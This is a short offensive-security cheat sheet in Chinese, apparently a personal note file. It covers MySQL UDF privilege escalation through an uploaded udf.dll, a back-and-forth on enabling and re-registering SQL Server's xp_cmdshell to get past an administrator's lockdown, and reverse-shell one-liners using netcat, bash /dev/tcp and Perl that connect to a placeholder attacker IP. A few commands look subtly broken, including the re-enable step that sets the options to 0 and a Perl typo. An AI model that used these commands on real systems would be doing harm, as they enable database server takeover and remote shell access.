# Notes
## SQL Injection
### UDF提權
1. MySQL >= 5.1, 上傳udf.dll到 MySQL安裝路徑下的 \lib\plugin。   
MySQL < 5.1, udf.dll在Windows Server 2003的C:\Windows\system32，如果是Windows Server 2000則是在 C:\Winnt\system32，也可以寫udf.dll的十六進位。(如Linux則是udf.so)
2. 自定義函數
```
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //import udf function
```
3. 
```
SELECT sys_eval('whoami');
```

### xp_cmdshell
1.  SQL Server :
```
exec xp_cmdshell 'ipconfig';
```

2. xp_cmdshell的對抗 :
```
//防守方 : 關閉xp_cmdshell
EXEC master.sys.sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

//攻撃方 : 重開xp_cmdshell
EXEC master.sys.sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

//防守方 : 如果xp_cmdshell可以這樣被重關，那就直接連同恢復的高級選項也關了吧
EXEC master.sys.sp_configure 'xp_cmdshell', 0; //Disable xp_cmdshell
RECONFIGURE;
EXEC master.sys.sp_configure 'show advanced options', 0; //Disable advanced options;
RECONFIGURE;

//攻撃方 : 先通過執行SQL語句打開advanced options，再打開xp_cmdshell;
EXEC master.sys.sp_configure 'show advanced options', 0;
RECONFIGURE;
EXEC master.sys.sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

//防守方 : 那就直接把相關的*.dll刪了
//攻撃方 : 直接上傳.dll到C:\inetpub\web\xplog70.dll, 再用xp_cmdshell
EXEC master.dbo.sp_addextendedproc 'xp_cmdshell', 'c:\inetpub\web\xplog70.dll';
RECONFIGURE; 

```

## Reverse Shell
### NetCat
```
//正向 Bash Shell
Victim :
nc -lvvp 5000 -e /bin/bash
Hacker :
nc victimIP 5000

//Reverse Bash Shell
Hacker : nc -lvvp 5000
Victim : nc -e /bin/bash hackerIP 5000

//Bash
bash -i >& /dev/tcp/hackerIPv4/Port 0>&1

//Perl
perl -e 'use Socket;$i="hackerIPv4";$p=5000;socket(S,PF_INET,SOCK_STREAM,get-protobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

//Python


```